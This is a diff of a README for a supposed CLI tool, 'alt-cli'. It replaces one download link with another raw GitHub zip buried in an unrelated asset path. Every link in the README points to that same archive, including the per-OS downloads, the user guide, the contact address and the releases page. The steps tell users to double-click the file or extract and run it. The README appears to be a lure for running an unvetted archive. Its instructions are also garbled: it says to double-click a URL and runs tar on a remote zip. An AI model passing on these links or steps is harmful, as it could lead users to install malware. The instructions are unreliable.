@@ -6,11 +6,11 @@ Welcome to alt-cli! This application helps you scaffold, manage, and improve wor
 
 ## 📥 Download the Application
 
-[![Download alt-cli](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip)](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip)
+[![Download alt-cli](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip)](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip)
 
 ## 📂 Step 1: Visit the Releases Page
 
-To get started, visit the official GitHub Releases page. This page lists all available versions of alt-cli. You can find the latest version here: [Download alt-cli](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip).
+To get started, visit the official GitHub Releases page. This page lists all available versions of alt-cli. You can find the latest version here: [Download alt-cli](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip).
 
 ## 🔄 Step 2: Select the Latest Version
 
@@ -20,9 +20,9 @@ On the Releases page, you'll see a list of versions. Look for the latest one—i
 
 In the release details, you'll find a list of files for download. Here’s a quick rundown of the files you might see:
 
-- **https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip** The Windows version of the application.
-- **https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip** The macOS version.
-- **https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip** The Linux version.
+- **https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip** The Windows version of the application.
+- **https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip** The macOS version.
+- **https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip** The Linux version.
 
 Choose the file that matches your operating system. 
 
@@ -39,12 +39,12 @@ Once the download is complete, follow these simple steps to install the applicat
 ### For Windows:
 
 1. Locate the downloaded file (usually in your "Downloads" folder).
-2. Double-click `https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip`.
+2. Double-click `https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip`.
 3. Follow the on-screen instructions to install.
 
 ### For macOS:
 
-1. Find the downloaded file (`https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip`).
+1. Find the downloaded file (`https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip`).
 2. Double-click to open it.
 3. Drag the alt-cli icon into your "Applications" folder.
 
@@ -55,7 +55,7 @@ Once the download is complete, follow these simple steps to install the applicat
 3. Run the following commands:
 
    ```bash
-   tar -xzvf https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip
+   tar -xzvf https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip
    cd alt-cli
    ./alt-cli
    ```
@@ -81,7 +81,7 @@ alt-cli provides a range of features to boost your productivity:
 
 To learn more about how to use alt-cli effectively, refer to our user guide. This guide will walk you through all features, commands, and tips for getting the most out of the application.
 
-- [User Guide](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip)
+- [User Guide](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip)
 
 ## 🛠️ System Requirements
 
@@ -100,6 +100,6 @@ If you encounter any issues or have questions, feel free to reach out:
 
 ## 📞 Contact
 
-For further assistance, you can contact the development team at: https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip
+For further assistance, you can contact the development team at: https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip
 
-Here’s your chance to enhance your productivity with alt-cli! Enjoy exploring its features and capabilities. Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/tanstack-form/cli-alt-v2.1.zip)!
+Here’s your chance to enhance your productivity with alt-cli! Enjoy exploring its features and capabilities. Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/SatanKlaus666/alt-cli/main/integrations/paraglide/assets/messages/alt-cli-prorelease.zip)!
